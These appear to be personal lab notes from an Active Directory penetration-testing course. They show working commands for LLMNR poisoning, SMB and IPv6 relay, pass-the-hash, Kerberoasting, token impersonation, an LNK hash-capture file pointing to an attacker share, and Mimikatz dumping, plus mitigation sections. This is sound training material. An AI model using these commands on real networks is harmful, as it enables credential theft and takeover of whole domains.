# LLMNR Poisoning
## LLMNR Poisoning Attacks
let's start a responder

![image](https://github.com/user-attachments/assets/9e89b6af-4e31-4e70-a91f-7873af3d6219)

wpad = allow web browser to automatically discover proxy without the need of any additonal configuration
For some reason, I can't enable w and P option at the same time so let's just stick with the P option instead

![image](https://github.com/user-attachments/assets/b9e20c94-7bfe-4fab-a7c5-0404cb90be80)

Let's go to punisher machine and use a domain account - fcastle:Password1
We can try to access the share with our attacker host IP address

![image](https://github.com/user-attachments/assets/e75dd889-4fd4-4700-9c21-815539f8b714)

we'll be prompted with this box

![image](https://github.com/user-attachments/assets/e3e80edc-df33-4bd0-a60c-1c4968251b09)

But on the attacker's machine, we should get the hash here

![image](https://github.com/user-attachments/assets/bb22dafc-4a12-414f-badb-ab97a1c8654a)

These hashes are equate to the same thing even though they are not identical

Now let's crack this hash using hashcat if we have cracking rigs, the process is going to be extremely fast on base OS. In this case we'll just use our vm since the password is quite easy

![image](https://github.com/user-attachments/assets/41fbdc28-cf13-428a-9e13-35cb00009f71)

The netNTLM hash uses mode 5600

we should get the cracked password here

![image](https://github.com/user-attachments/assets/d96b79d2-38c1-46ef-b270-ce808204ca2a)

## LLMNR Mitigation

![image](https://github.com/user-attachments/assets/ad441f88-37ae-4c8c-933d-e9c1f79d72fe)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

![image](https://github.com/user-attachments/assets/755dacee-308f-4512-a968-9b6183d00d41)

![image](https://github.com/user-attachments/assets/20070be8-e12f-42ba-870f-7b36d2235480)

![image](https://github.com/user-attachments/assets/b1c05aae-6017-42de-a1fe-644f14c779b1)

Then double click into that policy, enable it then push it out

# SMB Relay
## SMB Relay Attacks

we can use this syntax to check whether the target machine has smb signing enabled or not

```
nmap --script=smb2-security-mode.nse -p445,139 192.168.85.156 -Pn
```

See that the result from scanning DC will return that it's required so we can't perform the smb relay to DC

![image](https://github.com/user-attachments/assets/54448aab-b565-4c51-895e-732466470ed2)

As for both machines, they are not required

![image](https://github.com/user-attachments/assets/afdb1848-8489-4883-9ca1-919bb197f247)

Now, add our target ip to target.txt file to perform smb relay

![image](https://github.com/user-attachments/assets/308e3484-b2c8-4030-9285-be650bbea753)

Then change the responder configuration file to disable smb and http  

```
sudo subl /etc/responder/Responder.conf
```
![image](https://github.com/user-attachments/assets/12f323e5-6deb-4544-b2f5-45c56f8faf09)

Start a responder and perfrom smb relay

![image](https://github.com/user-attachments/assets/61b379d0-c431-410b-92d3-7bb71f9bf034)

This version of ntlm script is the best one even though there are new tools out there

```
ntlmrelayx.py -tf target.txt -smb2support
```

it waits for event to happen then execute the smb relay
First, login to THEPUNISHER machine using the domain account fcastle. Then navigate to the share of our attacking IP

![image](https://github.com/user-attachments/assets/e905fb25-c28f-4c96-8070-c92d7e49be6c)

The error should pop up and we can go check back at the attacking machine

![image](https://github.com/user-attachments/assets/994d443c-1baa-4aec-b669-f165daf0a5ac)

Note: If first try didn't work, try until it work (when I did it, it took 2 attempts)
We can see the smb relay try to relay itself to THEPUNISHER machine but didn't work since it's the machine that triggers the smb relay therefore it couldn't relay to itself. The smb relay works on SPIDERMAN machine with the account of fcastle

![image](https://github.com/user-attachments/assets/c1d1df9b-f01a-4ff1-9d93-d6b974df9034)

Local Admin hash: **aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f**

We have admin hash and local admin hash which is peterparker here. IRL pentest, we will note this down as a finding

Another attack apart from SAM dump would be to spawn an interactive shell

```
ntlmrelayx.py -tf target.txt -smb2support -i
```

Then trigger the attack by navigating to our attacking machine's share again

![image](https://github.com/user-attachments/assets/3128fa8d-7052-4adf-9bf3-325bcecebf32)

After the success, we can nc to bind to shell by doing

```
nc 127.0.0.1 11000
```

![image](https://github.com/user-attachments/assets/1cf6a664-c413-481e-8f97-4025225290a7)

Or execute the command 

```
ntlmrelayx.py -tf target.txt -smb2support -c "whoami"
```

## SMB Relay Mitigations

![image](https://github.com/user-attachments/assets/b0d2507a-1f2d-49bb-8ffd-8e78b21733be)

Normally, we'll do the last 2 method

Ex: for account tiering is like when bob is a Domain admin, we need just bob with low privilege account to login to his machine while he has bob-dc with admin privilege to login to the DC only. As for take away local account, we can remove the local admin rights from users and when they need to install something, they would need to request a ticket to support because support has the admin rights to install something on user's local machine

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

#  Gaining Shell Access 
We can use psexec on either metasploit or psexec py (most of the time py file is more quite and less likely to get picked up)

```
use exploit/windows/smb/psexec
```

![image](https://github.com/user-attachments/assets/6bf6db90-fc8e-48ee-bd6c-5e98f8751ee7)

There are a bunch of targers here, if the first one doesn't work, we can try alternative but the Native upload one is the best one
Note: Make sure to turn off real time protection so that the payload doesn't get picked up by windows defender

![image](https://github.com/user-attachments/assets/cfdf7c97-7704-4e9a-8135-5e6b0c2529df)

Target 0 didn't work for me let's try the 2rd one

![image](https://github.com/user-attachments/assets/9384d961-2824-47f3-b5b2-eebf159c53f8)

It works!

Above is when we attack a domain user, we can also attack a local user as well
We can use the hash we collect from smb relay SAM dump earlier (when cracking password, we need the NT or the second part but as for PTH, we need a whole hash)

![image](https://github.com/user-attachments/assets/8afd8761-04bf-4ac9-becf-0bd3c9c24949)

![image](https://github.com/user-attachments/assets/09674e21-73cf-42db-be03-99fa0df85800)

Even though we dump this from local machine but notice that when we created both THEPUNISHER and SPIDERMAN machine, we use the same password as admin and that's Password1 so we can reuse the hash since the hash from Password1 will result in the same hash

Now let's try with psexec.py

```
psexec.py MARVEL/fcastle:'Password1'@192.168.85.147
```
We sucessfully gain the shell as an admin by attacking Domain account

![image](https://github.com/user-attachments/assets/b7eccdad-0aad-437f-8487-d7548ae919fb)

If we got in a situation where the password has a weird character we can use this syntax and paste a password in later instead

![image](https://github.com/user-attachments/assets/c1dda801-2a13-4bfc-a766-344c1a1315b2)

Let's attack local admin with PTH

![image](https://github.com/user-attachments/assets/dd64ada1-caa3-4539-8e36-8abe8d5cfcfe)

If psexec doesn't work, remember that we still have tha alternatives like wmiexec or even smbexec

![image](https://github.com/user-attachments/assets/3cb10f76-0649-4d9c-90b0-dc5626bb14a4)

# IPv6 Attacks
##  IPv6 DNS Takeover via mitm6
We can use a tool called mitm6 to capture ipv6 traffic just like responder
Warning: This shouldn't be run for more than 5-10 mins since it can disrupt the whole network

```
sudo mitm6 -d marvel.local
```
Before running that let's run the ntlm relay just like before but this time instead of using -tf (target file) flag, we'll use -6 to specify IPv6 and -t as a target. Remember that we used to set a certificate for ldap from the lab setup and point the attack to DC ip. Then set up fake wpad and the loot (folder that will be created with loot files)

```
ntlmrelayx.py -6 -t ldaps://192.168.85.156 -wh fakewpad.marvel.local -l lootme
```

![image](https://github.com/user-attachments/assets/bffbe905-5c11-43fb-9b99-03f80e8cc2e2)

Then start the mitm6 and reboot THEPUNISHER machine to cause an event

![image](https://github.com/user-attachments/assets/cc1e8282-d76e-4648-9bf1-ca9f9075e7d6)

We should get a response of something like this

![image](https://github.com/user-attachments/assets/a603fa5b-f726-405c-85f2-a467aedec2f1)

We can check the lootme folder that was created in a location where we run ntlmrelayx (I ran it in download) and see the ldapdump files

![image](https://github.com/user-attachments/assets/adf5f617-44a7-4635-84b4-97e2ca0dc6b0)

![image](https://github.com/user-attachments/assets/788d3662-c244-49d0-8dc8-d0afbf977e90)

Interesting files here that we can check them out

When we login to the machine using Domain Admin account MARVEL\administrator:P@$$w0rd!

![image](https://github.com/user-attachments/assets/2a4303bc-a3f4-4249-b85d-3d54c3d72045)

See that it created a new user with enterprise admin privilege which can perform a secretdump.py to compromise the domain, even though it's not a domain admin that can access any machine but this is still huge

![image](https://github.com/user-attachments/assets/51e07d80-1e0d-4801-a870-5a6cf50a7f2d)

This user was actually created on the DC - CkJzjKxCCM:r>)rZhsgUn(y8*<

![image](https://github.com/user-attachments/assets/d6012fec-7f5d-4f71-9823-6a3e49c040e6)

## IPv6 Attack Defenses 

![image](https://github.com/user-attachments/assets/5999e53f-dd03-4a37-ab12-11626aac2cd7)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

We can set the blocks instead of disable them. Best practice is to disable WPAD & WIN proxy, LDAP signing to confirm that it's actually you not someone relaying

# Domain Enumeration
## ldapdomaindump
we can dump a bunch of info about the DC from this syntax

```
sudo ldapdomaindump ldaps://192.168.85.156 -u 'MARVEL\fcastle' -p 'Password1'
```

![image](https://github.com/user-attachments/assets/e8a85cd2-5ecc-43ed-b8ac-c0af04348962)

![image](https://github.com/user-attachments/assets/bf1aeee2-7997-49f1-82c1-c7a2e8cf99f3)

## BloodHound
Before start, make sure that bloodhound and neo4j is up to date by doing 

```
sudo pip3 install bloodhound
sudo apt install neo4j
```
In this case I'll just run it in venv since I can't install on normal env

```
python3 -m venv ~/venvs/bloodhound-env
source ~/venvsbloodhound-env/bin/activate
pip3 install bloodhound
deactivate
```

![image](https://github.com/user-attachments/assets/43347024-aa91-46ff-a525-db100eefe176)

Whenever I need to use bloodhound I'll call directly from the binary on my machine but as for bloodhound-python, I'll call it from venv environment

```
bloodhound-env/bin/bloodhound-python -h
```

![image](https://github.com/user-attachments/assets/a4abf516-cd1f-4699-aa75-1ba6eef35264)

Then start a neo4j console which will give us ip to a remote console

![image](https://github.com/user-attachments/assets/47f2fc75-26fa-4801-8d71-29da4c2c78c0)

When first login to the page, it'll prompt for username and password it's neo4j:neo4j

![image](https://github.com/user-attachments/assets/a162d4b7-930a-4c60-8040-818c5301d491)

It'll prompt for a new password I'll go with **neo4j1**

![image](https://github.com/user-attachments/assets/43ceab1c-554b-4b5e-8975-dda15877412c)

Then we can fire off bloodhound

```
sudo bloodhound
```

![image](https://github.com/user-attachments/assets/165cdefe-dc25-4265-adea-78a9603a866a)

enter the username and password we just created **neo4j:neo4j1**

![image](https://github.com/user-attachments/assets/f4c9597c-b988-429c-bfbf-e5facd787355)

We need to collect data that can be used here using ingester

```
bloodhound-env/bin/bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns <DC IP> -c all 
```

-ns = name server
-c = data collect which we'll collect all data

![image](https://github.com/user-attachments/assets/394c946d-0cd0-4234-939b-da5087f06b72)

We ran the scan and get a bunch of files here which we need to import into the bloodhound

![image](https://github.com/user-attachments/assets/4cb39731-10ed-4c7f-bdf6-2e734ff5dfd9)

We'll import all the files into bloodhound

![image](https://github.com/user-attachments/assets/63ebec7b-a637-4ee2-b98e-acc46601c599)

![image](https://github.com/user-attachments/assets/5b573d28-4f14-46d9-82cf-ce06c1b8938f)

We can check whether the info is sucessfully imported by checking database info which we have some data here and check the analysis

![image](https://github.com/user-attachments/assets/3638fb9a-60e1-4932-b0bd-6647c2f81b03)

We can see the graphical display of all domain admins

![image](https://github.com/user-attachments/assets/9627e8dd-a909-4b0f-a82d-e874bea02523)

## Plumhound
I install it inside the virtual env once again but without the env activation
```
sudo python3 -m venv /opt/AD_attack/PlumHound/venv
sudo /opt/AD_attack/PlumHound/venv/bin/pip install -r /opt/AD_attack/PlumHound/requirements.txt
```
Using Plumhound.py
```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py
```
Let's test if this works (Make sure that bloodhound is up and running since we will pull info from that and analyse the data inside bloodhound
```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py --easy -p neo4j1
```
We should be able to see the task here

![image](https://github.com/user-attachments/assets/2cbf8b20-df3d-4529-974a-7067ae32930e)

Let's create a report of the default tasks

```
sudo /opt/AD_attack/PlumHound/venv/bin/python /opt/AD_attack/PlumHound/PlumHound.py -x tasks/default.tasks -p neo4j1
```

![image](https://github.com/user-attachments/assets/efa6a27d-aad5-46d2-9fb5-67148ceb2d2c)

![image](https://github.com/user-attachments/assets/07c388c6-3d28-4ed9-92d9-05558df9e9bb)

We can check the index.html to see comprehensive report

![image](https://github.com/user-attachments/assets/b6a2bf7a-e3c7-4d33-86de-a82155b8243d)

# Pass Attacks
Let's try with crackmapexec to pass the credential of fcastle to see which machine that we have local admin privilege, see that there are 2 machines which includes THEPUNISHER and SPIDERMAN are successfully autenticate but not for HYDRA-DC since we have a valid cred that can login to that machine but we're not local admin on that DC

## Crackmapexec

```
crackmapexec smb 192.168.85.0/24 -u fcastle -d MARVEL.local -p Password1
```

![image](https://github.com/user-attachments/assets/6610db3c-d93a-4906-880e-469153a50985)

Now that we can access to these machines we want to dump out information using secretdumps

But for now, let's do pass the hash from local admin hash we got earlier

```
crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

![image](https://github.com/user-attachments/assets/3dc0bf98-e843-4fcc-b732-810f542c82d8)

See that we can authenticate into 2 machines since they have the same local admin password as Password1! but DC doesn't have this as a password that's why it failed 

--sam will dump out SAM hashes for us

```
crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --sam
```

![image](https://github.com/user-attachments/assets/9de5c351-c901-4152-a46c-3e1ad88bbc3f)

--shares can enumerate shares on each machines

```
crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --shares
```

![image](https://github.com/user-attachments/assets/e8d01ee8-e0fc-4364-8b5e-0e24ef4b72a0)

These shares are not the share we're connected too but it's a share that exists on the network that offer us that we can connect too

we can also dump lsass secrets using --lsa

```
crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth --lsa
```

![image](https://github.com/user-attachments/assets/e67b553d-40b5-47b2-a4c4-abc6041b4d3a)

This will show account that has logged into the machine see that we have domain admin hash here since we use that account to login to the machine before the problem wiht this is that this may be stored for months or weeks so the password might has already been reset to something else

We can see all modules using
```
crackmapexec smb -L
```
Then we can try to use lsassy module here which is the best one to look for recent login users
```
crackmapexec smb 192.168.85.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth -M lsassy
```
![image](https://github.com/user-attachments/assets/9b42f382-fef3-4581-9ccf-0e399282d4c7)

We can view crackmapexec database using cmedb

![image](https://github.com/user-attachments/assets/4728691a-0b67-4c8b-8984-d2e6f4f18da4)

## Dumping and Cracking Hashes
Using secretsdump

```
secretsdump.py MARVEL.local/fcastle:'Password1'@192.168.85.147
```

![image](https://github.com/user-attachments/assets/844927cb-a5fc-4692-96a4-a51b157a699f)

See that we can't see the password in clear text but in older windows version or legacy version, the protocol called wdigest can dump the passwords out in clear text which is disable in a newer version which can be enabled

We can force the switch to be on for wdigest and wait for someone to login then switch it off IRL pentest 

PTH attack is also possible

```
secretsdump.py administrator:@192.168.85.147 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```
So far the thought process is like this:

![image](https://github.com/user-attachments/assets/22922fe6-faf1-4aaf-b1ff-a3fe12e8e5f6)

we can get the last part to crack the password

```
hashcat -m 1000 '7facdc498ed1680c4fd1448319a8c04f' /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/user-attachments/assets/ac0cd1d2-39f0-41cb-925d-671c76c17501)

## Pass Attack Mitigations 

![image](https://github.com/user-attachments/assets/e1eccc16-6434-4886-aef2-c29043843218)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

# Kerberoasting
## Kerberoasting Attack

```
sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 192.168.85.156 -request
```

We can use any domain associated account but since we have the user account fcastle so we'll just use it to perform kerberoasting

![image](https://github.com/user-attachments/assets/42742bc9-58ba-4b51-b6b9-2296d532ef72)

If the last logon is never, it might be a honeypot account so be careful

It doesn't tell us that the service is running in domain admin group but most of the time, the service account will be running in domain admin group

We can grab the whole hashes and crack it 

```
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/user-attachments/assets/87c6bcda-2503-4218-bba6-25da4bc9cfbf)

We can use this cred to compromise the domain since this is the domain admin account

## Kerberoasting Mitigation 

![image](https://github.com/user-attachments/assets/7087a6a3-7957-4716-acfc-2f339e1eaad5)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

We shouldn't store the creds in AD description and don't give it a domain admin privilege

# Token Impersonation
## Token Impersonation Attack
We will use incognito, before that we need to get meterpreter shell using psexec and set these value before run the exploit

![image](https://github.com/user-attachments/assets/9b305b9c-c423-4ec6-ae11-51f8a74210d0)

Make sure to login to THEPUNISHER machine with domain fcastle account before running incognito since No Active User = No Active Tokens: If no user is signed in, there will be no access tokens available to impersonate.

There are a bunch of modules we can load in but in this case, we'll go with incognito

![image](https://github.com/user-attachments/assets/2e3358dd-eb22-4107-8fd6-d48cf30da9e2)

Let's try to impersonate fcastle since we are system right now

![image](https://github.com/user-attachments/assets/a2072c6b-ca16-4935-8e14-465293e3be6d)

For some reason when I tried to impersonte a token it errors out but then I check with whoami again, I got the fcastle token impersonated

![image](https://github.com/user-attachments/assets/664b0b20-e2fb-48f7-99d8-cb734d5f10fc)

Can use rev2self to reverse back to nt system

![image](https://github.com/user-attachments/assets/15e1aeba-d7ad-47e4-a92a-5120274e040b)

Now let's try login to the machine with domain admin account instead MARVEL\administrator:P@$$w0rd! and list tokens we can impersonate again

![image](https://github.com/user-attachments/assets/9e431d02-c0c0-4112-9868-3d5a2a77abfb)

Impersonate the token and we'll create POC by creating a new user **hawkeye:Password1@** and add him to domain group

```
PS C:\Users\administrator> net user /add hawkeye Password1@ /domain
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.

PS C:\Users\administrator> net group "Domain Admins" hawkeye /ADD /DOMAIN
The request will be processed at a domain controller for domain MARVEL.local.

The command completed successfully.
```

![image](https://github.com/user-attachments/assets/523994ca-cf30-422b-9650-b808ff01e353)

we can proof if hawkeye has domain admin rights by trying to do secretsdump on DC which a normal user shouldn't be able to do

![image](https://github.com/user-attachments/assets/aa81e297-9500-4fc4-97ce-d2ef274aa0e8)

![image](https://github.com/user-attachments/assets/1acc29aa-84f9-4fbe-ba22-f6871915d617)

A bunch of info we got

## Token Impersonation Mitigation

![image](https://github.com/user-attachments/assets/f35f6190-25af-416f-a602-9f72283efa26)

Credit graphic from: <a href='https://academy.tcm-sec.com/'>TCM academy</a>

Prevent Domain controller from accessing a machine

# LNK File Attack
We don't need to perform this on victim's machine, it can be perform anywhere

```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.85.56\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

![image](https://github.com/user-attachments/assets/6d11921f-078d-4e79-a57f-e72a99e66974)

After create the file link, append the file name with either @ or ~ so that the file gets push to the top view and copy to HYDRA-DC share inside hackme folder

![image](https://github.com/user-attachments/assets/c81e96aa-66af-4d63-a83e-2cb19638b7f1)

When we try to access hackme folder, the hash will be captured by responder (don't even need to run the file)

![image](https://github.com/user-attachments/assets/ee2f03b6-8063-4ac2-bfec-08d988709d0b)

we can also use netexec to set up link attack but the lab is not configured to expose the share to crackmapexec or netexec so this won't work

```
netexec smb 192.168.85.147 -d marvel.local -u fcatle -p Password1 -M slinky -o NAME=test SERVER=our-ip

```

reminder that -M slinky will see if there is an accessible share for that user and create the test file to upload onto the share for us

# Credential Dumping with Mimikatz

First, transport mimikatz x64 into the machine by hosting a python server and make sure to keep the file after download

![image](https://github.com/user-attachments/assets/95059d23-accc-4b73-84f6-786f7cdefada)

now open cmd with admin privilege and run mimikatz then set privilege mode to debug since most of the attacks require that

![image](https://github.com/user-attachments/assets/514920c9-ba63-482a-8e1e-ed6d2131fc27)

![image](https://github.com/user-attachments/assets/d0c328d3-0053-43a0-a7c4-ae1c0ac434ee)

we can see what we can do with sekurlsa but we will try with logonPasswords

![image](https://github.com/user-attachments/assets/3de3a071-7ebd-4a59-83b2-b246d5ec46fa)

We saw domain admin password stores in cred manager here. Recall that we have a file share Z that automatically connects to our accounts and is revealing domain admin password in cleartext because of that connection

![image](https://github.com/user-attachments/assets/ec4c953c-42cb-4eae-a437-252dc4fa7ab1)

![image](https://github.com/user-attachments/assets/4d347ad0-2306-476e-b851-6af19b76fc10)

# Dumping the NTDS.dit







